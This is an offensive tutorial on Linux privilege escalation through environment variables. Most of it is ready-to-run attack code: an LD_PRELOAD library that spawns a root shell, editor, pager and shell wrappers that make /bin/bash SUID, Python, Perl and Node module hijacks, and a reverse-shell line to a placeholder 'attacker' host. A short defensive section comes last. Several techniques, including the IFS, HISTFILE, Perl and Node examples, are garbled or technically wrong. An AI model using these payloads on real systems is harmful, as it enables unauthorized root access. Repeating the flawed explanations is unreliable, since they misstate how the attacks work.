## Environment Variable Abuse for Privilege Escalation

Environment variables are dynamic values that influence the behavior of processes. When privileged programs (root-owned processes, SUID binaries, or cron jobs) rely on unsanitized environment variables, attackers can manipulate them to execute arbitrary code with elevated privileges.

---

### 1. Understanding Environment Variables

**What Are Environment Variables?**
- Key-value pairs that affect process behavior
- Inherited from parent process to child processes
- Can be set system-wide or per-user
- Critical for many system operations

**Common Environment Variables**:
| Variable | Purpose | Exploitation Risk |
|----------|---------|-------------------|
| `PATH` | Executable search paths | High - command hijacking |
| `LD_PRELOAD` | Preload shared libraries | Very High - code injection |
| `LD_LIBRARY_PATH` | Additional library search paths | High - library hijacking |
| `IFS` | Internal Field Separator | Medium - command parsing |
| `EDITOR`/`VISUAL` | Default text editor | High - file overwrite |
| `PAGER` | Default pager | Medium - command execution |
| `TMPDIR` | Temporary directory | Low-Medium - file manipulation |
| `BASH_ENV` | Bash initialization file | High - arbitrary code execution |
| `ENV` | Shell initialization (POSIX) | High - arbitrary code execution |
| `SHELL` | Default shell | Medium - command execution |
| `HOME` | Home directory | Medium - file read/write |
| `HISTFILE` | Command history file | Low - log tampering |
| `PYTHONPATH` | Python module search path | High - module hijacking |
| `PERL5LIB` | Perl module search path | High - module hijacking |
| `NODE_PATH` | Node.js module search path | High - module hijacking |
| `LD_DEBUG` | Dynamic linker debugging | Low - information leak |
| `RES_OPTIONS` | Resolver options | Medium - DNS hijacking |

---

### 2. Enumeration: Finding Exploitable Variables

**Check Current Environment**:
```bash
# View all environment variables
printenv
# Or
env

# View specific variables
echo $PATH
echo $LD_PRELOAD
echo $LD_LIBRARY_PATH
echo $IFS
echo $EDITOR
```

**Check Variables Inherited by Privileged Processes**:
```bash
# Check root's environment (if you can read /proc)
cat /proc/1/environ | tr '\0' '\n'
cat /proc/*/environ | tr '\0' '\n' | sort -u

# Check cron's environment
cat /etc/crontab | grep -i "env\|path"
cat /var/spool/cron/crontabs/* 2>/dev/null | grep -i "env\|path"

# Check sudo environment
sudo -l  # Shows environment variables preserved
# Look for "env_keep" settings
```

**Check SUID Binary Environment Handling**:
```bash
# Run SUID binary with strace to see environment
strace -e trace=execve /usr/bin/passwd 2>&1 | grep execve

# Check which variables are preserved
strings /usr/bin/suid_binary | grep -E "^[A-Z_]+$"
```

**Find Writable Environment Files**:
```bash
# System-wide environment files
find /etc -name "environment" -o -name "profile" -o -name "bash.bashrc" -o -name "*.sh" -path "*/profile.d/*" 2>/dev/null

# User environment files
find /home -name ".bashrc" -o -name ".profile" -o -name ".bash_profile" 2>/dev/null
find /root -name ".bashrc" -o -name ".profile" 2>/dev/null
```

**Automated Tools**:
```bash
# LinPEAS environment checks
./linpeas.sh | grep -A 10 "Environment"

# Manual comprehensive check
for var in PATH LD_PRELOAD LD_LIBRARY_PATH IFS EDITOR VISUAL PAGER BASH_ENV SHELL; do
    echo "$var = ${!var}"
done
```

---

### 3. LD_PRELOAD Exploitation (Most Dangerous)

`LD_PRELOAD` loads a shared library **before** any other libraries. This allows overriding any function.

#### A. Direct LD_PRELOAD on SUID Binaries

**Exploitation**:
```bash
# 1. Create malicious shared library
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor runs when library is loaded
__attribute__((constructor))
void init() {
    // Drop root privileges? No, we want to keep them
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

// Override a common function (e.g., getuid)
int getuid() {
    return 0; // Always return root
}
EOF

# 2. Compile as shared library
gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so

# 3. Execute SUID binary with LD_PRELOAD
LD_PRELOAD=/tmp/backdoor.so /usr/bin/passwd
# This might not work if the binary sanitizes LD_PRELOAD
```

**Why It Might Not Work**: Modern SUID binaries **drop environment variables** for security.

#### B. LD_PRELOAD via sudo env_keep

If `sudo` preserves LD_PRELOAD, this is a direct root shell.

**Exploitation**:
```bash
# Check if LD_PRELOAD is in env_keep
sudo -l | grep env_keep | grep LD_PRELOAD

# If present:
export LD_PRELOAD=/tmp/backdoor.so
sudo /bin/true  # Any command, library loads as root
```

**Finding env_keep**:
```bash
# Check sudo configuration
cat /etc/sudoers | grep env_keep
cat /etc/sudoers.d/* | grep env_keep

# Look for: env_keep += "LD_PRELOAD"
```

#### C. LD_PRELOAD in Cron Environment

If cron's environment includes LD_PRELOAD, every cron job will load your library.

**Exploitation**:
```bash
# Add to cron environment (if writable)
# /etc/crontab:
LD_PRELOAD=/tmp/backdoor.so
* * * * * root /bin/true

# Or add to user crontab (if you can)
crontab -e
# Add: LD_PRELOAD=/tmp/backdoor.so
```

---

### 4. LD_LIBRARY_PATH Exploitation

`LD_LIBRARY_PATH` adds directories to the library search path.

**Exploitation**:
```bash
# 1. Find which libraries a SUID binary uses
ldd /usr/bin/passwd
# Output: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# 2. Create a directory with a fake library
mkdir /tmp/fake_lib
gcc -shared -fPIC -o /tmp/fake_lib/libc.so.6 backdoor.c

# 3. Set LD_LIBRARY_PATH
LD_LIBRARY_PATH=/tmp/fake_lib /usr/bin/passwd

# 4. The binary loads your libc instead of system libc
# This gives complete control
```

**Limitation**: SUID binaries drop LD_LIBRARY_PATH (same as LD_PRELOAD).

**Bypass**: If binary is **SGID** instead of SUID, some systems still honor LD_LIBRARY_PATH.

---

### 5. IFS (Internal Field Separator) Exploitation

`IFS` determines how the shell splits words. Manipulating it can change command parsing.

**Vulnerable Script**:
```bash
#!/bin/bash
# /usr/local/bin/backup.sh
BACKUP_DIR="/backup"
FILE="data"
cp $BACKUP_DIR/$FILE /tmp/  # No quotes!
```

**Exploitation**:
```bash
# 1. Create malicious directory
mkdir "/backup/data"
echo 'cp /bin/bash /tmp/shell; chmod +s /tmp/shell' > "/backup/data/x"

# 2. Set IFS to "/" so directory separators are ignored
export IFS='/'

# 3. Run the script (as root)
/usr/local/bin/backup.sh
# The command becomes: cp backup data /tmp/ (completely different!)
```

**Alternative IFS Exploit**:
```bash
# Script: echo "User: $(whoami)"
# Set IFS to: \n (newline)
export IFS=$'\n'
# The command becomes: echo User: root (if executed as root)
```

---

### 6. EDITOR/VISUAL Exploitation

If root uses these variables to open a file, the editor can be hijacked.

**Exploitation**:
```bash
# 1. Create malicious editor wrapper
cat > /tmp/editor.sh << 'EOF'
#!/bin/bash
# Execute backdoor, then open real editor
chmod +s /bin/bash
/usr/bin/vim "$@"
EOF
chmod +x /tmp/editor.sh

# 2. Set EDITOR variable
export EDITOR=/tmp/editor.sh
export VISUAL=/tmp/editor.sh

# 3. Trigger root's editor usage
# sudo crontab -e  (if root uses your editor)
# sudo visudo  (if uses your editor)
```

**Common Exploitation Points**:
```bash
# sudoedit (sudo -e) - opens files as root
export EDITOR=/tmp/editor.sh
sudo -e /etc/hosts  # Your editor runs as root

# crontab -e (as root)
export EDITOR=/tmp/editor.sh
sudo crontab -e

# Git commits (if used by root)
export EDITOR=/tmp/editor.sh
sudo git commit --amend
```

---

### 7. PAGER Exploitation

Some commands use `PAGER` to display output. If root runs such commands, you can hijack.

**Exploitation**:
```bash
# 1. Create malicious pager
cat > /tmp/pager.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
# Show actual output using less
/usr/bin/less "$@"
EOF
chmod +x /tmp/pager.sh

# 2. Set PAGER variable
export PAGER=/tmp/pager.sh

# 3. Trigger root command that uses PAGER
# Example: systemctl status service
sudo systemctl status sshd  # Might use PAGER

# Example: man pages (if root runs man)
sudo man ls
```

---

### 8. BASH_ENV and ENV Exploitation

`BASH_ENV` is read by non-interactive bash shells (cron, scripts). `ENV` is used by POSIX sh.

**Exploitation**:
```bash
# 1. Create malicious initialization file
cat > /tmp/bashrc.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
echo "Backdoor installed"
EOF

# 2. Set BASH_ENV
export BASH_ENV=/tmp/bashrc.sh

# 3. Any non-interactive bash script run as root will execute this
sudo /bin/bash -c "echo test"
# Or wait for cron to run a bash script
```

**Cron Attack**:
```bash
# Add to user's crontab (if you can)
BASH_ENV=/tmp/backdoor.sh
* * * * * root /bin/bash -c "backup_script"
```

---

### 9. Python Environment Exploitation

#### A. PYTHONPATH Hijacking

Modules are loaded from `PYTHONPATH` directories.

**Exploitation**:
```bash
# 1. Identify Python script called by root
# Example: /usr/local/bin/backup.py
# Contains: import os

# 2. Create malicious os.py in writable directory
mkdir /tmp/pylibs
cat > /tmp/pylibs/os.py << 'EOF'
import os
import subprocess
# Backdoor
subprocess.call(["chmod", "+s", "/bin/bash"])
# Forward to real os
import sys
sys.path.remove('/tmp/pylibs')
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import os as real_os
sys.modules['os'] = real_os
EOF

# 3. Set PYTHONPATH
export PYTHONPATH=/tmp/pylibs

# 4. Run the Python script as root
sudo /usr/local/bin/backup.py
```

#### B. Python Startup File (`PYTHONSTARTUP`)

Executed when interactive Python starts.

**Exploitation**:
```bash
cat > /tmp/startup.py << 'EOF'
import os
os.system("chmod +s /bin/bash")
EOF

export PYTHONSTARTUP=/tmp/startup.py
sudo python3  # When root runs Python interactively
```

---

### 10. Perl Environment Exploitation

#### A. PERL5LIB and PERLLIB

Module search paths for Perl.

**Exploitation**:
```bash
mkdir /tmp/perllibs
cat > /tmp/perllibs/File/Find.pm << 'EOF'
package File::Find;
sub find { system("chmod +s /bin/bash"); }
1;
EOF

export PERL5LIB=/tmp/perllibs
sudo perl -e 'use File::Find; find();'
```

#### B. PERL_DEBUG and PERL_DESTRUCT_LEVEL

Debugging variables can be exploited in some circumstances.

---

### 11. Node.js Environment Exploitation

#### A. NODE_PATH Module Hijacking

**Exploitation**:
```bash
mkdir /tmp/nodemods
cat > /tmp/nodemods/fs.js << 'EOF'
const { exec } = require('child_process');
exec('chmod +s /bin/bash');
module.exports = require('fs_original');
EOF

export NODE_PATH=/tmp/nodemods
sudo node /path/to/script.js
```

---

### 12. SSH Environment Exploitation

If `PermitUserEnvironment` is enabled in SSH, users can set environment variables.

**Exploitation**:
```bash
# 1. Create ~/.ssh/environment
echo "LD_PRELOAD=/tmp/backdoor.so" > ~/.ssh/environment

# 2. Wait for root to SSH in
# (or if SSH is configured to allow root login)

# 3. When root connects, LD_PRELOAD loads as root
```

**Check SSH Configuration**:
```bash
grep -i "PermitUserEnvironment" /etc/ssh/sshd_config
# If: PermitUserEnvironment yes  -> Exploitable!
```

---

### 13. TMPDIR Exploitation

If a privileged program uses `TMPDIR` to create temporary files, you can control file location.

**Exploitation**:
```bash
# 1. Create directory with malicious permissions
mkdir /tmp/evil_tmp
chmod 777 /tmp/evil_tmp

# 2. Set TMPDIR
export TMPDIR=/tmp/evil_tmp

# 3. Run program that creates temporary files
# If it creates a temporary script and executes it:
# (this depends on the specific program behavior)

# 4. Race condition: replace file before execution
```

**Example: Kernel Compilation**:
```bash
# If root compiles kernel with your TMPDIR
export TMPDIR=/tmp/evil_tmp
sudo make  # May create files in /tmp/evil_tmp
```

---

### 14. HISTFILE Manipulation

If root uses your `HISTFILE`, you can inject commands into root's history.

**Exploitation**:
```bash
# Create fake history file
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" > /tmp/fake_history

# Set HISTFILE
export HISTFILE=/tmp/fake_history

# When root runs a command, it appends to your history
# But you can't make root run your commands
```

---

### 15. SHELL Variable Exploitation

Some programs use `SHELL` to spawn a shell.

**Exploitation**:
```bash
# 1. Create malicious shell wrapper
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
/bin/bash "$@"
EOF
chmod +x /tmp/shell.sh

# 2. Set SHELL
export SHELL=/tmp/shell.sh

# 3. Trigger program that uses SHELL
sudo less /etc/hosts  # 'v' command opens editor, uses SHELL
# Or: sudo -i  # Uses SHELL to start login shell
```

---

### 16. Practical Exploitation Workflow

**Step 1: Enumerate Environment Variables**:
```bash
# Check current environment
printenv | sort

# Check what sudo preserves
sudo -l | grep env_keep

# Check root's environment
cat /proc/1/environ | tr '\0' '\n' | sort

# Check cron's environment
cat /etc/crontab | grep -v '^#'
```

**Step 2: Identify Privileged Programs**:
```bash
# Find SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Find scripts executed by root (cron, init)
find /etc/cron* -type f 2>/dev/null
find /etc/init.d/ -type f 2>/dev/null
```

**Step 3: Check for Sanitization**:
```bash
# Test if LD_PRELOAD works on SUID binary
export LD_PRELOAD=/lib/libc.so.6  # Already exists
/usr/bin/passwd
# If it works, LD_PRELOAD is NOT sanitized

# Check if LD_LIBRARY_PATH works
export LD_LIBRARY_PATH=/tmp
/usr/bin/passwd
```

**Step 4: Choose Attack Vector**:
```bash
# Prioritize based on:
# 1. LD_PRELOAD (if env_keep or unsanitized)
# 2. LD_LIBRARY_PATH (if unsanitized)
# 3. EDITOR/VISUAL (if root uses sudoedit or crontab -e)
# 4. PATH (if writable directory in PATH)
# 5. BASH_ENV (if cron uses bash)
# 6. PYTHONPATH/PERL5LIB (if root runs scripts)
```

**Step 5: Create and Execute Exploit**:
```bash
# Example: LD_PRELOAD exploit
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so

export LD_PRELOAD=/tmp/backdoor.so
sudo /bin/true  # Any command
```

**Step 6: Verify Escalation**:
```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### 17. Defensive Measures

**For System Administrators**:

1. **Sanitize Environment in SUID Binaries**:
   ```c
   // In C/C++ programs
   clearenv();  // Clear all environment variables
   setenv("PATH", "/usr/local/bin:/usr/bin:/bin", 1);
   ```

2. **Use `env` to Reset Environment**:
   ```bash
   # Run command with clean environment
   env - /usr/bin/safe_command
   
   # In scripts
   #!/bin/bash
   exec env -i /usr/bin/safe_script
   ```

3. **Configure Sudo Properly**:
   ```bash
   # In /etc/sudoers
   Defaults env_reset  # Reset environment
   Defaults env_keep += "HOME"  # Only necessary variables
   
   # Never include LD_PRELOAD in env_keep
   Defaults env_keep -= "LD_PRELOAD"
   Defaults env_keep -= "LD_LIBRARY_PATH"
   ```

4. **Set Explicit PATH in Scripts**:
   ```bash
   #!/bin/bash
   export PATH=/usr/local/bin:/usr/bin:/bin
   # Now use commands without absolute paths safely
   ```

5. **Use Absolute Paths in Scripts**:
   ```bash
   #!/bin/bash
   /bin/echo "Using absolute path"
   /usr/bin/tar -czf /backup/backup.tar.gz /data
   ```

6. **Remove Unnecessary Environment Variables**:
   ```bash
   # In /etc/profile or /etc/bash.bashrc
   unset LD_PRELOAD
   unset LD_LIBRARY_PATH
   ```

7. **Set Secure Mount Options**:
   ```bash
   # Mount /tmp with noexec to prevent library execution
   mount -o remount,noexec /tmp
   ```

8. **Use AppArmor/SELinux**:
   ```bash
   # Restrict which libraries can be loaded
   # AppArmor profile for sensitive binaries
   ```

9. **Audit Environment Variables**:
   ```bash
   # Check what users can set
   for user in $(getent passwd | cut -d: -f1); do
       echo "=== $user ==="
       sudo -u $user env 2>/dev/null
   done
   ```

